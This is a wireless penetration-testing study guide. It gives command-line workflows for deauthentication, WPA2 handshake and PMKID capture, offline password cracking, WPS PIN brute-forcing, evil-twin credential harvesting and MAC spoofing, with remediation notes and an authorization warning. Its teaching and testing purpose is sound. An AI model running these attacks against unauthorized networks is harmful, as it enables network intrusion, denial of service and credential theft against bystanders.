# 12 - WIRELESS PENTESTING

**Author:** Zeeshan  
**GitHub:** https://github.com/mzeeshanzafar28  
**LinkedIn:** https://www.linkedin.com/in/mzeeshanzafar28

---

## Table of Contents

1. [802.11 Fundamentals](#1-80211-fundamentals)
2. [Wi-Fi Bands & Channels](#2-wi-fi-bands--channels)
3. [Encryption Standards (WEP/WPA/WPA2/WPA3)](#3-encryption-standards)
4. [WPA2-Personal vs WPA2-Enterprise](#4-wpa2-personal-vs-wpa2-enterprise)
5. [WPA3-SAE](#5-wpa3-sae)
6. [WPS (Wi-Fi Protected Setup)](#6-wps)
7. [Hardware Requirements](#7-hardware-requirements)
8. [Monitor Mode](#8-monitor-mode)
9. [Wireless Reconnaissance](#9-wireless-reconnaissance)
10. [Handshake Capture (WPA/WPA2)](#10-handshake-capture)
11. [Deauthentication Attacks](#11-deauthentication-attacks)
12. [PMKID Attack (No Deauth Required)](#12-pmkid-attack)
13. [Offline Cracking (Aircrack-ng & Hashcat)](#13-offline-cracking)
14. [WEP Assessment](#14-wep-assessment)
15. [WPS PIN Attacks (Reaver/Bully)](#15-wps-pin-attacks)
16. [Rogue Access Points & Evil Twin](#16-rogue-access-points--evil-twin)
17. [Captive Portals](#17-captive-portals)
18. [Aircrack-ng Suite Reference](#18-aircrack-ng-suite-reference)
19. [Automated Tools (Wifite/Airgeddon/Fluxion)](#19-automated-tools)
20. [Post-Association Testing](#20-post-association-testing)
21. [Wireless Analysis with Wireshark](#21-wireless-analysis-with-wireshark)
22. [Enterprise Wireless (802.1X/RADIUS)](#22-enterprise-wireless)
23. [RADIUS Ports](#23-radius-ports)
24. [Client Attacks & Probe Requests](#24-client-attacks--probe-requests)
25. [MAC Filtering & Spoofing](#25-mac-filtering--spoofing)
26. [Common Pitfalls](#26-common-pitfalls)
27. [Practical Exam Workflow](#27-practical-exam-workflow)
28. [Tools & Techniques Mapping](#28-tools--techniques-mapping)
29. [Practice & Lab Setup](#29-practice--lab-setup)

---

## 1. 802.11 Fundamentals

Wi-Fi is based on the IEEE 802.11 family of standards. Key concepts:

| Term | Meaning |
|---|---|
| **AP** | Access Point — the device that provides wireless network access |
| **STA** | Station — a wireless client device (laptop, phone, IoT) |
| **BSSID** | MAC address identifying a specific AP radio (the actual unique identifier you target) |
| **SSID** | Human-readable wireless network name (multiple APs can share one SSID) |
| **ESSID** | Extended Service Set Identifier |
| **Channel** | Radio-frequency operating channel; your adapter must be tuned to the target's channel |
| **Band** | Frequency range: 2.4 GHz, 5 GHz, 6 GHz |

**Frame Types (critical to understand attacks):**

```
Management Frames  — Beacons, Probe Requests/Responses, Authentication, Deauthentication
                     NOT encrypted even on WPA2 unless 802.11w (PMF) is enforced
Control Frames     — RTS, CTS, ACK
Data Frames        — Actual data traffic (encrypted when WPA/WPA2/WPA3 is used)
```

> **The reason deauth attacks work:** Deauthentication frames are management frames. Management frames are **not encrypted** on standard WPA2 networks (unless Protected Management Frames / 802.11w is enforced).

```
SSID  = network name (displayed to users)
BSSID = AP radio MAC address (what you actually target)
```

---

## 2. Wi-Fi Bands & Channels

### 2.4 GHz
- Channels **1, 6, 11** — non-overlapping 20 MHz channels in most regulatory domains
- Longer range but more congested

### 5 GHz
- More channels, less congestion
- Shorter range; channel availability depends on regulatory domain

### 6 GHz (Wi-Fi 6E/7)
- Newer spectrum; additional channels
- May require adapters that explicitly support 6 GHz

---

## 3. Encryption Standards

### WEP (Wired Equivalent Privacy)
- **OBSOLETE** — cryptographically broken by design (weak IV reuse in RC4)
- Cracking is fast and reliable with enough captured IVs
- If found in an engagement: document as critical finding; remediation is **replace with WPA2-AES or WPA3**

### WPA (Wi-Fi Protected Access)
- Interim improvement over WEP (TKIP); now obsolete
- Rare to encounter today

### WPA2
- Standard for most of the last decade; uses **AES-CCMP**
- Not "broken" in the encryption sense — the practical attack is against the **4-way handshake** (capture it, crack the PSK offline)
- Modes: **WPA2-Personal** (PSK) and **WPA2-Enterprise** (802.1X)

### WPA3
- Current standard; replaces 4-way handshake with **SAE** (Simultaneous Authentication of Equals / "Dragonfly")
- Resists offline dictionary attacks far better than WPA2-PSK
- Modes: **WPA3-Personal** and **WPA3-Enterprise**
- If you encounter WPA3 in an exam: do not attempt brute-force — look for misconfigurations, WPS still enabled, WPA2 fallback, etc.

---

## 4. WPA2-Personal vs WPA2-Enterprise

### WPA2-Personal (PSK)
```
SSID + Pre-Shared Key (password)
         |
    Key derivation (PSK → PMK → PTK)
         |
    Session encryption
```

Attack model: capture authentication material → offline password guessing → recover PSK → authenticate.

### WPA2-Enterprise
```
Wireless Client → AP → Authenticator → RADIUS Server → Identity Store (AD/LDAP)
```

Common EAP methods: **EAP-TLS**, **PEAP**, **EAP-TTLS**, **EAP-FAST**, **EAP-MSCHAPv2**

Enterprise testing requires attention to certificate validation, EAP method selection, and client configuration.

---

## 5. WPA3-SAE

SAE = Simultaneous Authentication of Equals. Practical distinction:

```
WPA2-Personal → handshake capture → offline PSK guessing
WPA3-SAE      → stronger password-authentication design → different attack model
```

Do not blindly apply WPA2 handshake-cracking methodology to WPA3-SAE. A weak password can still be a problem, but the protocol changes the mechanics of offline attacks.

---

## 6. WPS (Wi-Fi Protected Setup)

Designed for easy client onboarding via 8-digit PIN. **Critical flaw:** the PIN is validated as two independent halves (4-digit + 3-digit + checksum), massively reducing the real brute-force search space to ~11,000 attempts regardless of the WPA2 password strength.

Mechanisms:
- **PIN** (vulnerable in older implementations)
- **Push Button Configuration (PBC)**
- **NFC** (some implementations)

```bash
wash -i wlan0mon              # Scan for WPS-enabled APs
```

> **WPS enabled ≠ WPS vulnerable.** Modern routers often implement rate-limiting and lockout.

---

## 7. Hardware Requirements

A compatible USB Wi-Fi adapter is effectively mandatory. Most built-in laptop cards do NOT reliably support monitor mode or packet injection.

**Recommended chipsets:**
- **Atheros AR9271** (ALFA AWUS036NHA)
- **Realtek RTL8812AU** (ALFA AWUS036ACH — dual band)
- **Ralink RT5370**

Verify capabilities:
```bash
iw list                       # Check supported interface modes
# Look for: * monitor, * managed
```

Test injection:
```bash
sudo aireplay-ng -9 wlan0mon  # Injection test
```

---

## 8. Monitor Mode

Monitor mode allows a compatible interface to capture ALL 802.11 frames on a channel without associating to an AP.

```bash
# Kill interfering processes (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify (usually creates wlan0mon)
iw dev

# Stop monitor mode and restore
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

Manual alternative:
```bash
ip link set wlan0 down
iwconfig wlan0 mode monitor
ip link set wlan0 up
```

---

## 9. Wireless Reconnaissance

### Passive Discovery (airodump-ng)

```bash
sudo airodump-ng wlan0mon
```

Output interpretation:

| Field | Meaning |
|---|---|
| BSSID | AP MAC address |
| PWR | Received signal level (closer to 0 = stronger) |
| CH | Channel |
| ENC | Encryption (WPA2, WEP, OPN) |
| CIPHER | CCMP, TKIP |
| AUTH | PSK, MGT (802.1X Enterprise) |
| ESSID | Network name |

### Targeted Capture (lock to single AP)

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w corpwifi wlan0mon
```

This produces `corpwifi-01.cap`. Locking to a channel avoids packet loss from channel hopping.

### Client Discovery

Airodump-ng shows associated stations. Clients reveal:
- Device MAC addresses
- Probe requests (preferred networks)
- Authentication attempts

---

## 10. Handshake Capture (WPA/WPA2)

The 4-way handshake happens every time a client authenticates. Capturing it gives you the material to crack the PSK offline.

```
Client                         AP
  |                            |
  | ---- Message 1 (ANonce)--> |
  | <--- Message 2 (SNonce) -- |
  | ---- Message 3 (GTK) ----> |
  | <--- Message 4 (ACK) ----- |
```

**Step-by-step:**
```bash
# 1. Start targeted capture (Terminal 1 — keep running)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 2. Force reconnection if no client is naturally connecting (Terminal 2)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# 3. Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" to appear in Terminal 1
```

**Confirm handshake:**
```bash
aircrack-ng capture-01.cap
```

> Capturing a handshake does NOT reveal the password by itself. You must test candidate passwords against the captured material.

---

## 11. Deauthentication Attacks

Sends forged deauth management frames to force a client to disconnect and reconnect (generating a fresh handshake). Management frames are unauthenticated on standard WPA2.

```bash
# Target specific client
sudo aireplay-ng --deauth 10 -a AP_BSSID -c CLIENT_MAC wlan0mon

# Broadcast to ALL clients (noisier, more disruptive)
sudo aireplay-ng --deauth 10 -a AP_BSSID wlan0mon
```

**Use the smallest number of frames necessary.** Continuous deauth against production users = denial of service.

**802.11w / PMF:** Modern networks with Protected Management Frames enabled may mitigate this. If deauth fails, check if PMF is in use.

---

## 12. PMKID Attack (No Deauth Required)

A newer, **stealthier** technique that does NOT require deauthenticating a client. Some APs include the PMKID (Pairwise Master Key Identifier) in the first EAPOL frame, which can be requested directly.

```bash
# 1. Capture PMKID (no deauth needed)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# 2. Convert to hashcat format
hcxpcapngtool -o hash.22000 capture.pcapng

# 3. Crack with hashcat
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

Only works against APs that support/expose PMKID (most modern consumer/enterprise APs do).

---

## 13. Offline Cracking

### Aircrack-ng (CPU)

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Hashcat (GPU — faster)

```bash
# Convert capture first
hcxpcapngtool -o capture.22000 capture-01.cap

# Check hashcat mode
hashcat --help | grep -i WPA

# Crack (mode 22000 = WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 capture.22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 capture.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### John the Ripper
```bash
# Convert capture
hccap2john capture-01.cap > hash.john

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt hash.john
```

**The attack only recovers the PSK if it's weak enough to be in (or derivable from) your wordlist.** WPA2's cryptography itself is not broken — you're brute-forcing the passphrase offline.

---

## 14. WEP Assessment

If WEP is encountered (rare today):

```bash
# Capture
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write wep wlan0mon

# Crack (requires enough IVs — thousands to hundreds of thousands)
aircrack-ng wep-01.cap
```

> Remediation: Replace WEP with WPA2-AES or WPA3. WEP cannot be made secure by choosing a stronger password.

---

## 15. WPS PIN Attacks

### Reaver
```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### Bully
```bash
sudo bully -b AA:BB:CC:DD:EE:FF -i wlan0mon
```

**Before testing:**
- Confirm WPS is enabled (`wash -i wlan0mon`)
- Confirm target BSSID and scope
- Check lockout behavior (modern APs rate-limit after failed attempts)

If WPS is enabled AND not rate-limited, this often recovers the WPA2 passphrase far faster than an offline handshake crack.

---

## 16. Rogue Access Points & Evil Twin

### Rogue AP
An unauthorized AP connected to or impersonating an organization's network (employee personal hotspot, attacker-connected AP, compromised AP).

### Evil Twin
An AP that impersonates a legitimate network by broadcasting the same SSID.

```
Legitimate AP (SSID = CorpWiFi)     vs     Rogue AP (SSID = CorpWiFi)
```

**Attack workflow (conceptual):**
1. Capture authentication material from target AP
2. Create impersonating AP with same SSID
3. Optionally deauth clients from the real AP to push them to yours
4. Serve a cloned captive portal / capture traffic / harvest credentials

**Mitigations:** Strong WPA2/WPA3 authentication, enterprise certificate validation, 802.11w (PMF).

---

## 17. Captive Portals

Common in hotels, airports, universities, and guest networks.

Testing areas:
- Authentication/authorization bypass
- Client isolation effectiveness
- Portal bypass techniques
- DNS redirect handling
- HTTPS enforcement
- Session management
- Rate limiting

> A captive portal is NOT equivalent to network encryption.

---

## 18. Aircrack-ng Suite Reference

| Tool | Purpose |
|---|---|
| `airmon-ng` | Manage monitor mode (start/stop/check) |
| `airodump-ng` | Capture and discover wireless traffic |
| `aireplay-ng` | Packet injection (deauth, fake auth, ARP replay) |
| `aircrack-ng` | Analyze and crack supported captures |
| `airdecap-ng` | Decrypt captures with known keys |
| `airbase-ng` | AP emulation (rogue AP/evil twin) |
| `packetforge-ng` | Craft custom packets for injection |
| `airserv-ng` | Remote wireless interface access |

**Typical workflow:**
```
airmon-ng → airodump-ng → target BSSID/channel → capture
  → optional deauth → handshake captured → aircrack-ng
```

---

## 19. Automated Tools

### Wifite / Wifite2 (Recommended for exam speed)

Fully automated: handles monitor mode, scanning, deauth, capture, and cracking.

```bash
sudo wifite                    # Interactive mode
sudo wifite --kill             # Kill interfering processes
sudo wifite -i wlan0mon        # Specify interface
sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt   # With wordlist
```

### Airgeddon

Menu-driven bash framework wrapping aircrack-ng, hostapd, dnsmasq, etc.

```bash
sudo airgeddon
```

Supports: handshake capture, Evil Twin, WPS brute-force, Enterprise AP attacks.

### Fluxion

Specialized evil-twin / captive-portal framework with social engineering.

```bash
./fluxion.sh
```

Workflow: captures handshake → spawns rogue AP (evil twin) → deauths everyone → serves cloned captive portal → verifies entered password against handshake.

### Kismet

Passive wireless network detector, sniffer, and IDS. Works without sending any packets.

```bash
sudo kismet -c wlan0mon
```

Useful for passive discovery of hidden SSIDs and network mapping. (Note: Original notes mention "Akismet" which is a WordPress anti-spam plugin — the correct tool is **Kismet**.)

---

## 20. Post-Association Testing

Once authorized wireless access is obtained:

```bash
ip addr                          # Identify IP
ip route                         # Identify gateway and routes
ip neigh                         # ARP table / nearby hosts
cat /etc/resolv.conf             # DNS configuration
resolvectl status                # Modern DNS status
```

**Host discovery (controlled):**
```bash
nmap -sn 10.20.30.0/24           # Ping sweep on wireless subnet
```

Test segmentation: Can a guest wireless client reach internal services? This is often a major finding.

---

## 21. Wireless Analysis with Wireshark

```bash
wireshark capture-01.cap
```

**Useful filters:**

| Filter | Purpose |
|---|---|
| `wlan` | All wireless frames |
| `wlan.bssid == AA:BB:CC:DD:EE:FF` | Filter by AP |
| `wlan.fc.type == 0` | Management frames |
| `wlan.fc.type == 1` | Control frames |
| `wlan.fc.type == 2` | Data frames |
| `wlan.fc.type_subtype == 8` | Beacon frames |
| `wlan.fc.type_subtype == 11` | Authentication |
| `wlan.fc.type_subtype == 12` | Deauthentication |
| `wlan.fc.type_subtype == 10` | Disassociation |
| `eapol` | EAPoL / handshake frames |

---

## 22. Enterprise Wireless (802.1X/RADIUS)

Enterprise authentication typically uses 802.1X/EAP against a RADIUS server.

**Critical testing area: Certificate validation.** Weak client configuration permits:
```
Rogue AP → Fake RADIUS identity → Credential capture / authentication attack
```

Test:
- Trusted CA configuration
- Expected server name validation
- Certificate validity checks
- EAP method selection
- Credential protection
- VLAN assignment (guest vs employee)

**Dynamic VLAN assignment:**
```
Employee credentials → VLAN 10
Guest credentials    → VLAN 20
IoT credentials      → VLAN 30
```

Test whether a lower-privileged user can obtain an unintended network assignment.

---

## 23. RADIUS Ports

```
1812/UDP = Authentication
1813/UDP = Accounting

1645/UDP = Legacy authentication
1646/UDP = Legacy accounting
```

---

## 24. Client Attacks & Probe Requests

Clients actively search for known networks by sending probe requests. Passive capture can reveal:
- Client MAC address
- Requested SSIDs (preferred networks)
- Channel and timing

**Security implication:**
```
Probe information → Attacker learns network names → Potential targeted rogue-AP
```

Modern clients with MAC randomization reduce this exposure, but behavior varies.

---

## 25. MAC Filtering & Spoofing

MAC filtering attempts to restrict access by MAC address. **Not a security control** — MAC addresses can be changed.

```bash
# Random MAC
sudo ip link set wlan0 down
sudo macchanger -r wlan0
sudo ip link set wlan0 up

# Specific MAC
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0
```

---

## 26. Common Pitfalls

- Forgetting to kill NetworkManager / wpa_supplicant before monitor mode
- Using a card that does not support injection
- Trying to crack without a valid handshake / PMKID
- Channel mismatch during capture (interface hopping loses packets)
- Wordlist too small or wrong encoding
- Applying WPA2 methodology blindly to WPA3-SAE
- Sending excessive deauth frames (DoS in production)
- Relying on MAC filtering as a security control

---

## 27. Practical Exam Workflow

```
1. Put card in monitor mode
        |
2. Discover networks (airodump-ng)
        |
3. Target specific AP (lock BSSID + channel)
        |
4a. Capture handshake (wait or deauth)   OR   4b. PMKID capture (passive)
        |
5. Crack offline (aircrack-ng / hashcat)
        |
6. Connect with recovered PSK
        |
7. Post-association: identify IP, gateway, routes, network
        |
8. Enumerate internal services from wireless segment
        |
9. Check segmentation (guest → internal?)
        |
10. Pivot to internal network if possible
```

**Goal:** Put card in monitor mode, capture a handshake (or PMKID), and crack a weak PSK in under 10-15 minutes.

---

## 28. Tools & Techniques Mapping

| Technique | Primary Tool | Command |
|---|---|---|
| Monitor Mode Setup | airmon-ng | `sudo airmon-ng start wlan0` |
| Network Discovery | airodump-ng | `sudo airodump-ng wlan0mon` |
| Targeted Capture | airodump-ng | `sudo airodump-ng -c CH --bssid MAC -w file wlan0mon` |
| Deauthentication | aireplay-ng | `sudo aireplay-ng -0 5 -a AP -c CLIENT wlan0mon` |
| PMKID Capture | hcxdumptool | `sudo hcxdumptool -i wlan0mon -o file.pcapng --enable_status=1` |
| Convert to Hashcat | hcxpcapngtool | `hcxpcapngtool -o hash.22000 capture.pcapng` |
| Offline Cracking | aircrack-ng | `aircrack-ng -w wordlist.txt capture-01.cap` |
| GPU Cracking | hashcat | `hashcat -m 22000 hash.22000 rockyou.txt` |
| WPS Discovery | wash | `wash -i wlan0mon` |
| WPS Attack | reaver | `reaver -i wlan0mon -b BSSID -vv` |
| Automated Auditing | Wifite | `sudo wifite` |
| Framework | Airgeddon | `sudo airgeddon` |
| Evil Twin | Fluxion | `./fluxion.sh` |
| Passive Recon | Kismet | `sudo kismet -c wlan0mon` |
| Wireless Analysis | Wireshark | `wireshark capture-01.cap` |
| MAC Spoofing | macchanger | `sudo macchanger -r wlan0` |
| Injection Test | aireplay-ng | `sudo aireplay-ng -9 wlan0mon` |

---

## 29. Practice & Lab Setup

### Hardware Required
- USB Wi-Fi adapter with monitor mode + packet injection (ALFA AWUS036ACH or AWUS036NHA)
- Dedicated router/AP you own (for your test network)

### Home Lab Setup
1. Set up a guest Wi-Fi network on your own router
2. Configure it with a deliberately weak WPA2 password
3. Connect your phone to this guest network
4. Pass the USB adapter through to a Kali VM
5. Practice: monitor mode → capture handshake → crack → connect
6. Repeat with different scenarios: WEP, WPS enabled, WPA2-Enterprise

### Practice Targets
- TryHackMe: "Wifi Hacking 101" rooms
- Set your own AP to WEP, then WPA2 with weak password, then enable WPS
- Practice all attack paths: handshake capture, PMKID, WPS, evil twin

> **Warning:** Only perform wireless attacks on networks you own or have explicit written authorization to test. Wireless attacks can affect nearby networks.
